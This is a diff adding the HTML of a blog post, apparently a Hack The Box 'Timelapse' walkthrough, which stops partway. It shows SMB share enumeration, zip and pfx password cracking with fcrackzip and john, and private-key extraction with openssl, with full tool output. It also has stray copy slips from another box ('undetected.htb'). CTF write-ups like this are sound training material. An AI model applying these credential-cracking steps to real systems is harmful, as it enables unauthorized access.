@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        Timelapse -- HTB walkthrough ::
+        Werz — CyberSecurity
+      </title>
+    
+    <head>
+  
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-R2DLLBQDPX"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-R2DLLBQDPX', { 'anonymize_ip': false });
+}
+</script>
+
+
+</head>
+
+<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="The official box pageon HTB
+The writeup:#System Scan | IP: 10.10.11.152#let&amp;rsquo;s add the ip to to the /etc/hosts file and name it undetected.htb
+ echo &#39;10.10.11.152 undetected.htb &#39; &amp;gt;&amp;gt; /etc/hosts
+ startup full ports nmap scan | -sC for the default set of scripts. | -sV for Enables version detection. | -T4 for sending the traffic fast.
+ `nmap -sC -sV -T4 10.10.11.152 -p-"
+/>
+
+<meta
+  name="keywords"
+  content="ctf, hackthebox, writeup, htb writeup, walkthrough, retired htb, hack the box, cybersecurtiy, capture the flag"
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://0xwerz.github.io/26/03/2022/timelapse/" />
+<meta content="Posts about Cybersecurity, Pentesting, CTF writeups, and more" property="og:description" />
+<meta content="https://0xwerz.github.io/" property="og:url" />
+<meta content="Werz         Cybersecurity content, And more" property="og:title" />
+
+
+
+
+
+<link rel="stylesheet" href="https://0xwerz.github.io/assets/style.css" />
+
+<link rel="stylesheet" href="https://0xwerz.github.io/style.css" />
+
+
+<link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
+<link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png%20%7c%20absURL">
+<link rel="icon" type="image/png" sizes="32x32" href="img/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="img//android-chrome-192x192.png">
+<link rel="manifest" href="img/site.webmanifest">
+<link rel="mask-icon" href="img/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+
+
+<link href="https://0xwerz.github.io/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://0xwerz.github.io/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://0xwerz.github.io/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://0xwerz.github.io/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://0xwerz.github.io/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://0xwerz.github.io/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Timelapse -- HTB walkthrough"/>
+<meta name="twitter:description" content="https://app.hackthebox.com/machines/Undetected"/>
+
+
+
+<meta property="og:title" content="Timelapse -- HTB walkthrough" />
+<meta property="og:description" content="https://app.hackthebox.com/machines/Undetected" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://0xwerz.github.io/26/03/2022/timelapse/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-03-26T06:24:55+13:00" />
+<meta property="article:modified_time" content="2022-03-26T06:24:55+13:00" /><meta property="og:site_name" content="Werz" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="https://0xwerz.github.io/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >werz@blog:~$</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/archive">./archive</a></li>
+        
+      
+        
+          <li><a href="/posts">./articles</a></li>
+        
+      
+        
+          <li><a href="/about">./whoami</a></li>
+        
+      
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/archive">./archive</a></li>
+      
+    
+      
+        <li><a href="/posts">./articles</a></li>
+      
+    
+      
+        <li><a href="/about">./whoami</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">Timelapse &ndash; HTB walkthrough</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2022-03-26
+        </span>
+
+        
+          
+        
+      
+
+      
+        <span class="post-author"
+          >— Written by 0xWerz</span
+        >
+
+
+      
+        <span class="post-read-time"
+          >— 7 min read</span
+        >
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="https://0xwerz.github.io/tags/htb/">#htb</a>&nbsp;
+        
+          <a href="https://0xwerz.github.io/tags/windows/">#windows</a>&nbsp;
+        
+          <a href="https://0xwerz.github.io/tags/easy/">#easy</a>&nbsp;
+        
+          <a href="https://0xwerz.github.io/tags/retired/">#retired</a>&nbsp;
+        
+          <a href="https://0xwerz.github.io/tags/smbclient/">#smbclient</a>&nbsp;
+        
+          <a href="https://0xwerz.github.io/tags/laps/">#laps</a>&nbsp;
+        
+          <a href="https://0xwerz.github.io/tags/evil-winrm/">#evil-winrm</a>&nbsp;
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+      <p>The official <a href="https://app.hackthebox.com/machines/Timelapse" target="_blank">box page</a>
+ on HTB</p>
+<img src="https://github.com/0xWerz/CTF-writeups/raw/main/HTB/Machines/timelapse/img/Timelapse.png" style="border-radius: 3%;" alt="">
+<h3 id="the-writeup">
+  The writeup:
+  <a href="#the-writeup" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<h4 id="system-scan--ip-101011152">
+  System Scan | <strong>IP: 10.10.11.152</strong>
+  <a href="#system-scan--ip-101011152" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>let&rsquo;s add the ip to to the <code>/etc/hosts</code> file and name it <code>undetected.htb</code></p>
+<blockquote>
+<p><code>echo '10.10.11.152 undetected.htb ' &gt;&gt; /etc/hosts</code></p>
+</blockquote>
+<p>startup full ports nmap scan | <strong>-sC for the default set of scripts</strong>. | <strong>-sV for Enables version detection</strong>. | <strong>-T4 for sending the traffic fast</strong>.</p>
+<blockquote>
+<p>`nmap -sC -sV -T4 10.10.11.152 -p-</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">werz@ctf01:~/ctf/htb/timelapse$ nmap -sC -sV -T4 10.10.11.152 -p-
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-07-06 02:41 +01
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.152
+Host is up <span style="color:#f92672">(</span>0.29s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">998</span> filtered ports 
+
+PORT      STATE SERVICE           VERSION
+53/tcp    open  domain            Simple DNS Plus
+88/tcp    open  kerberos-sec      Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2022-07-15 10:09:34Z<span style="color:#f92672">)</span>
+135/tcp   open  msrpc             Microsoft Windows RPC
+139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp   open  ldap              Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: timelapse.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ldapssl?
+3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: timelapse.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+3269/tcp  open  globalcatLDAPssl?
+5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dc01.timelapse.htb
+| Not valid before: 2021-10-25T14:05:29
+|_Not valid after:  2022-10-25T14:25:29
+|_ssl-date: 2022-07-15T10:11:07+00:00; +7h59m59s from scanner time.
+| tls-alpn: 
+|_  http/1.1
+9389/tcp  open  mc-nmf            .NET Message Framing
+49667/tcp open  msrpc             Microsoft Windows RPC
+49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc             Microsoft Windows RPC
+49696/tcp open  msrpc             Microsoft Windows RPC
+56370/tcp open  msrpc             Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m57s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2022-07-15T10:10:30
+|_  start_date: N/A
+</code></pre></div><h2 id="smb-enumeration">
+  SMB enumeration
+  <a href="#smb-enumeration" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>Since smb port-445 is open, as always I&rsquo;ll check for some accessible content im using <a href="https://www.google.com/search?q=smbmap&amp;oq=smbmap&amp;aqs=chrome..69i57.262j0j7&amp;sourceid=chrome&amp;ie=UTF-8" target="_blank">smbmap</a>
+:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">werz@ctf01:~/ctf/htb/timelapse$ smbmap -H 10.10.11.152 -u ff                                                                                           INT ✘  06:58:25 PM 
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /<span style="color:#e6db74">&#34;       )|&#34;</span>  <span style="color:#ae81ff">\ </span>   /<span style="color:#e6db74">&#34;  ||   _  &#34;</span><span style="color:#ae81ff">\ </span>|<span style="color:#e6db74">&#34;  \    /&#34;</span>  |     /<span style="color:#e6db74">&#34;&#34;</span><span style="color:#ae81ff">\ </span>      |   __ <span style="color:#e6db74">&#34;\
+</span><span style="color:#e6db74">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+</span><span style="color:#e6db74">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#39; /\  \     |:  ____/
+</span><span style="color:#e6db74">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#39;  \    (|  /
+</span><span style="color:#e6db74">   /&#34;</span> <span style="color:#ae81ff">\ </span>  :<span style="color:#f92672">)</span> |.  <span style="color:#ae81ff">\ </span>   /:  <span style="color:#f92672">||</span>: |_<span style="color:#f92672">)</span>  :<span style="color:#f92672">)</span>|.  <span style="color:#ae81ff">\ </span>   /:  | /   /  <span style="color:#ae81ff">\ </span>  <span style="color:#ae81ff">\ </span> /|__/ <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>  <span style="color:#f92672">(</span>_______/  |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>_______/ |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>___/    <span style="color:#ae81ff">\_</span>__<span style="color:#f92672">)(</span>_______<span style="color:#f92672">)</span>
+ -----------------------------------------------------------------------------
+     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com   
+                     https://github.com/ShawnDEvans/smbmap
+
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 10.10.11.152:445    Name: timelapse.htb0          Status: Guest session       
+        Disk                                                      Permissions    Comment
+    ----                                                      -----------    -------
+    ADMIN$                                                NO ACCESS    Remote Admin
+    C$                                                    NO ACCESS    Default share
+    IPC$                                                  READ ONLY    Remote IPC
+    NETLOGON                                              NO ACCESS    Logon server share 
+    Shares                                                READ ONLY    
+    SYSVOL                                                NO ACCESS    Logon server share
+</code></pre></div><p>So we have access to the shares disk! I&rsquo;ll dig in with smbclient | <code>-N</code> for none password you also can leave it empty.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">werz@ctf01:~/ctf/htb/timelapse$ smbclient <span style="color:#ae81ff">\\\\</span>10.10.11.152<span style="color:#ae81ff">\\</span>shares -N                                                                                  INT ✘  07:02:08 PM 
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> dir
+  .                                   D        <span style="color:#ae81ff">0</span>  Mon Oct <span style="color:#ae81ff">25</span> 16:39:15 <span style="color:#ae81ff">2021</span>
+  ..                                  D        <span style="color:#ae81ff">0</span>  Mon Oct <span style="color:#ae81ff">25</span> 16:39:15 <span style="color:#ae81ff">2021</span>
+  Dev                                 D        <span style="color:#ae81ff">0</span>  Mon Oct <span style="color:#ae81ff">25</span> 20:40:06 <span style="color:#ae81ff">2021</span>
+  HelpDesk                            D        <span style="color:#ae81ff">0</span>  Mon Oct <span style="color:#ae81ff">25</span> 16:48:42 <span style="color:#ae81ff">2021</span>
+
+        <span style="color:#ae81ff">6367231</span> blocks of size 4096. <span style="color:#ae81ff">2043344</span> blocks available
+</code></pre></div><p>Dev folder have a single file, which I&rsquo;ll grab:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smb: <span style="color:#ae81ff">\&gt;</span> cd dev
+smb: <span style="color:#ae81ff">\d</span>ev<span style="color:#ae81ff">\&gt;</span> ls
+  .                                   D        <span style="color:#ae81ff">0</span>  Mon Oct <span style="color:#ae81ff">25</span> 20:40:06 <span style="color:#ae81ff">2021</span>
+  ..                                  D        <span style="color:#ae81ff">0</span>  Mon Oct <span style="color:#ae81ff">25</span> 20:40:06 <span style="color:#ae81ff">2021</span>
+  winrm_backup.zip                    A     <span style="color:#ae81ff">2611</span>  Mon Oct <span style="color:#ae81ff">25</span> 16:46:42 <span style="color:#ae81ff">2021</span>
+get qw
+        <span style="color:#ae81ff">6367231</span> blocks of size 4096. <span style="color:#ae81ff">2086053</span> blocks available
+smb: <span style="color:#ae81ff">\d</span>ev<span style="color:#ae81ff">\&gt;</span> get winrm_backup.zip 
+getting file <span style="color:#ae81ff">\d</span>ev<span style="color:#ae81ff">\w</span>inrm_backup.zip of size <span style="color:#ae81ff">2611</span> as winrm_backup.zip <span style="color:#f92672">(</span>3.4 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 3.4 KiloBytes/sec<span style="color:#f92672">)</span>
+</code></pre></div><p>HelpDesk folder have some files about LAPS they may be helpful:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smb: <span style="color:#ae81ff">\&gt;</span> dir helpdesk/
+  .                                   D        <span style="color:#ae81ff">0</span>  Mon Oct <span style="color:#ae81ff">25</span> 16:48:42 <span style="color:#ae81ff">2021</span>
+  ..                                  D        <span style="color:#ae81ff">0</span>  Mon Oct <span style="color:#ae81ff">25</span> 16:48:42 <span style="color:#ae81ff">2021</span>
+  LAPS.x64.msi                        A  <span style="color:#ae81ff">1118208</span>  Mon Oct <span style="color:#ae81ff">25</span> 15:57:50 <span style="color:#ae81ff">2021</span>
+  LAPS_Datasheet.docx                 A   <span style="color:#ae81ff">104422</span>  Mon Oct <span style="color:#ae81ff">25</span> 15:57:46 <span style="color:#ae81ff">2021</span>
+  LAPS_OperationsGuide.docx           A   <span style="color:#ae81ff">641378</span>  Mon Oct <span style="color:#ae81ff">25</span> 15:57:40 <span style="color:#ae81ff">2021</span>
+  LAPS_TechnicalSpecification.docx      A    <span style="color:#ae81ff">72683</span>  Mon Oct <span style="color:#ae81ff">25</span> 15:57:44 <span style="color:#ae81ff">2021</span>
+
+        <span style="color:#ae81ff">6367231</span> blocks of size 4096. <span style="color:#ae81ff">2085269</span> blocks available
+</code></pre></div><h2 id="shell-as-legacyy">
+  Shell as legacyy
+  <a href="#shell-as-legacyy" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>The ZIP file is a password protected:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">werz@ctf01:~/ctf/htb/timelapse$ unzip winrm_backup.zip
+Archive:  winrm_backup.zip
+<span style="color:#f92672">[</span>winrm_backup.zip<span style="color:#f92672">]</span> legacyy_dev_auth.pfx password: 
+</code></pre></div><p>We can try to bruteforce the passphrase, I&rsquo;m using <strong>fcrackzip</strong> with rockyou wordlist:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">werz@ctf01:~/ctf/htb/timelapse$ fcrackzip -D -u winrm_backup.zip  -p rockyou.txt 
+
+PASSWORD FOUND!!!!: pw <span style="color:#f92672">==</span> supremelegacy
+
+werz@ctf01:~/ctf/htb/timelapse$ unzip winrm_backup.zip
+Archive:  winrm_backup.zip
+<span style="color:#f92672">[</span>winrm_backup.zip<span style="color:#f92672">]</span> legacyy_dev_auth.pfx password:
+  inflating: legacyy_dev_auth.pfx
+
+werz@ctf01:~/ctf/htb/timelapse$ file legacyy_dev_auth.pfx
+legacyy_dev_auth.pfx: data
+</code></pre></div><blockquote>
+<ul>
+<li>The PKCS#12 or PFX/P12 format is a binary format for storing the server certificate, intermediate certificates, and the private key in one encryptable file</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>These files usually have extensions such as .pfx  and .p12</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>They are typically used on Windows machines to import and export certificates and private keys</li>
+</ul>
+</blockquote>
+<p>So we need to extract the private key and certificate from the <strong>.pfx</strong> file. here is a walkthrough <a href="https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file" target="_blank">post</a>
+</p>
+<p>Unfortunately it&rsquo;s also protected with a passphrase:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">werz@ctf01:~/ctf/htb/timelapse$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key
+Enter Import Password:
+</code></pre></div><p><a href="https://github.com/sirrushoo/python/blob/master/pfx2john.py" target="_blank">pfx2john.py</a>
+ will generate a hash and we we&rsquo;ll save it into a file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">werz@ctf01:~/ctf/htb/timelapse$ pfx2john.py legacyy_dev_auth.pfx | tee legacyy.hash
+legacyy_dev_auth.pfx:$pfxng$1$20$2000$20$eb755568327396de179c4a5d668ba8fe550ae18a$3082099c3082060f06092a864886f70d010701a0820600048205fc308205f8308205f4060b2a864886f70d010c0a0102a08204fe308204fa301c060a2a864886f70d010c0103300e04084408e3852b96a898020207d0048204d8febcd5536b4b831d491da6d53ca889d95f094572da48eed1a4a14cd88bbfff72924328212c0ff047b42d0b7062b3c6191bc2c23713f986d1febf6d9e1829cd6663d2677b4af8c7a25f7360927c498163168a2543fd722188558e8016f59819657759c27000d365a302da21eda4b73121dcc4eede60533b0ef0873a99b92cc7f824d029385fa8b6859950912cd0a257fa55f150c2135f2850832b3229033f2552f809e70010fab8868bb7d5bef7c20408dac3f67e367f4c3e3b81a555cdfe9e89c7bc44d6996f401f9a26e43094b6fa418a76d5b57579eeb534627a27fd46350a624b139d9ff4b124c9afbbbe42870026098bbc7d38b6b543ab6eff3cf2972c87dd2c0e703ef2a0120062a97279661b67ca596a650efde28e098c82fce01f50611e28d4a6d5d75af8bf965c07faa68331b9f66733deb32ee3628b156ee0ef8e63b732e3606f3c6c9453b49d15592648cd918deaf72889f3e0bcf42bfdb9cddae7e77c5934579d658bfea78800013f36de7e7fadd2f0ff96e78dedaba0593947f96989fad67e17470b49307b5199248fbad36a0dee42e480b30785810a4c17cc27b0e0ed3a99ddec9720a968f3ccbffb36752febbbca437ecacd6c93c6ef2ff6277de01545a482daf34d1faf38819737b7e4ef61004c2876715123fd0b8a4f6c03eb387fd50eaaf4977870a6c011c91f1c9093dc2aa0e2c72c0a5e1473ef89429b02ab1efbf09b096efecb65d6e772d8eb2ca2e72aa288749d6fdbf9b207592f3a9ad16676d9f0aba1fb2f180f7b715b6c2238a42c13b00f8dc26c41ababbca74b84b42294ff473a0f16c85ac7f2072981968f8b868885655f50ea81f06e5e65d269853e537e18268add9046681f9a6d0233d171f900b34cf0c63d299eb67d7a8ebfcfbf88395de5c7fd5bd1085d20cc56b3ca847e6f21fba58215ff91bed70e5f629c9257baa848f29fab2efb9170f8c51e680dde4d6d2eebaa602b24444f43ccfb607efa46f378539664c6309f51d82f67347fc689e855966069099dead6f19adadcf9c6a0d2c42401846eba828bffad6f7336df1ea091844f2074e976a5d2eb83db0646fb43b3faad564ac577781f29de95b7b21b6caf7f9de6d2d56150de098faf9a684b2a79083b3555455272874e9c427e1b1349b94c0baf73eee08832274df7c4ac23b68f66cb86ba0561e1bb83b0e920b4568371c89c2a80ed63308a4d9ce2e12d74de3f83fe5d93ab3aadd65a8821814f9981e20cdb86615d04ef9d45c30d692ad058212b33a0c8966414b3840a77af33b2fe85791a16e4922a9458cb584903515470d57607ce412e0699c883ddd40ad4983f9e6164879a19fc554781823782c89b47c3bf36a6eb4d33194753e85cb13e112a3e9fce98b72565961d1bace71a8086657bce391bdb2a5e4b8025b06984fbb2da341034e9750b33ef2a1dccddde7b867084faf8264a4379c17dfad736a382fa7510e674ca7fefba611cc64313242d3166a04165d4f70607bd988181f06ff4dca04035c14111c7d93a1169efcece8c3616e971131ff54c42a35f3c43f374131b8634999052aa7a479274f6b9d64e414d2775fcf8f7e68897032902547c92885136f0f14e04e62519a02c03a4d0bf412e517f4b51e42ff27b40d7222d722424c56abb1b183158fef0f9d04bbc45d5341a4cb26d03a5864a6f51b9bd315918aa491393a5b6dc622dad6b25e131e43077ab421c4bcd6ed6dfbd52afd4dcb19a27797cbf983181e2300d06092b06010401823711023100301306092a864886f70d0109153106040401000000305d06092a864886f70d01091431501e4e00740065002d00340061003500330034003100350037002d0063003800660031002d0034003700320034002d0038006400620036002d006500640031003200660032003500630032006100390062305d06092b060104018237110131501e4e004d006900630072006f0073006f0066007400200053006f0066007400770061007200650020004b00650079002000530074006f0072006100670065002000500072006f007600690064006500723082038506092a864886f70d010701a0820376048203723082036e3082036a060b2a864886f70d010c0a0103a08203423082033e060a2a864886f70d01091601a082032e0482032a308203263082020ea00302010202101d9989298acf11bb4193a1cff44e12df300d06092a864886f70d01010b050030123110300e06035504030c074c656761637979301e170d3231313032353134303535325a170d3331313032353134313535325a30123110300e06035504030c074c65676163797930820122300d06092a864886f70d01010105000382010f003082010a0282010100a55607a36216471ee2f34d23ad6171ce8b9eb34a872bf689bce78603bbfeaa1c16b835ff3114fe8834d04d9585af0310af28cf1a42c1e9bf7b68a70a50f986d1643bb5371ca1bdf34d4d15e3745415f672222a4a303adea01b617ef4ee60545e0f0271cf9be6183f0b1ba1191857c40ea73222e8d319803089ae02125999941ea4e1c9b156ffb3ce99ed60b3ab623755c5a0fbb5ccd3986882f776d65a6b35dc2f0e88a532513c90161adb6ac85a26998ac9a82cc249a5aef631b4a7584a2bb9a4eb0bc1491f107c75b6a97f7e35b2ca7a00adfbf8c06babb657d96ef8adcc0b635a4b33a8222e472cc8e7aee8d1a02c77bfa6572f428f085cc3304a8b1491f10203010001a3783076300e0603551d0f0101ff0404030205a030130603551d25040c300a06082b0601050507030230300603551d1104293027a025060a2b060104018237140203a0170c156c6567616379794074696d656c617073652e687462301d0603551d0e04160414ccd90ee4af209eb0752bfd81961eac2db1255819300d06092a864886f70d01010b050003820101005f8efb76bfde3efe96fdda72c84b8ae76bb0882aba9a9bdeba1fc905eadee91d93e510364caf5eeee7492f4cdd43e0fb650ae77d49a3eca2449b28da05817d4a357e66ef6174dca08b226875cf896dc6c73a2603a09dc0aa7457d7dedd04cb747b286c7aade2edbd4e0567e9e1be55d3789fcf01773f7f06b6adf88fb1f579d564ce604cdc8299e074726d06a9ae370ded9c42a680caa9eb9298ce9293bef335263848e6dc4686a6dd59b9f6952e308c6cb7606459c3aa0cebaec6175dd5ab65f758764ae4d68ffb929ac1dfc9f8cb3aae26343c36e19f1d78def222a0760c8860a72ac1dd5a232b1b65162cea1e52b9549a9af4ebd918fe79fbfb34846b6a403115301306092a864886f70d0109153106040401000000$86b99e245b03465a6ce0c974055e6dcc74f0e893:::::legacyy_dev_auth.pfx
+
+</code></pre></div><p>We&rsquo;ll go forward for cracking with john. it may takes some time</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">werz@ctf01:~/ctf/htb/timelapse$ john --wordlist<span style="color:#f92672">=</span>rockyou.txt legacyy.hash 
+Using default input encoding: UTF-8
+Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>pfx, <span style="color:#f92672">(</span>.pfx, .p12<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>PKCS#12 PBE <span style="color:#f92672">(</span>SHA1/SHA2<span style="color:#f92672">)</span> 256/256 AVX2 8x<span style="color:#f92672">])</span>
+Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">2000</span> <span style="color:#66d9ef">for</span> all loaded hashes
+Cost <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>mac-type <span style="color:#f92672">[</span>1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512<span style="color:#f92672">])</span> is <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">for</span> all loaded hashes
+Will run <span style="color:#ae81ff">4</span> OpenMP threads
+Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, <span style="color:#e6db74">&#39;h&#39;</span> <span style="color:#66d9ef">for</span> help, almost any other key <span style="color:#66d9ef">for</span> status
+thuglegacy       <span style="color:#f92672">(</span>legacyy_dev_auth.pfx<span style="color:#f92672">)</span>     
+1g 0:00:00:24 DONE <span style="color:#f92672">(</span>2022-06-30 17:29<span style="color:#f92672">)</span> 0.04115g/s 132993p/s 132993c/s 132993C/s thuglife03282006..thscndsp1
+Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div><p>After some time we got the password <code>thuglegacy</code></p>
+<h3 id="extracting-keys">
+  Extracting keys
+  <a href="#extracting-keys" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>When extracting the key, it asks for a password <code>thuglegacy</code>, and then a password for the .pem file could be anything you want: im following this article again <a href="https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file" target="_blank">Extracting the certificate and keys</a>
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
+werz@ctf01:~/ctf/htb/timelapse$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key
+Enter Import Password:
+Enter PEM pass phrase:
+Verifying - Enter PEM pass phrase:
+</code></pre></div><p>I&rsquo;ll the decrypt the key also:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">werz@ctf01:~/ctf/htb/timelapse$ openssl rsa -in legacyy_dev_auth.enc-key -out legacyy_dev_auth.key
+Enter pass phrase <span style="color:#66d9ef">for</span> legacyy_dev_auth.key-enc:
+writing RSA key
+</code></pre></div><p>Same thing for the cert:</p>
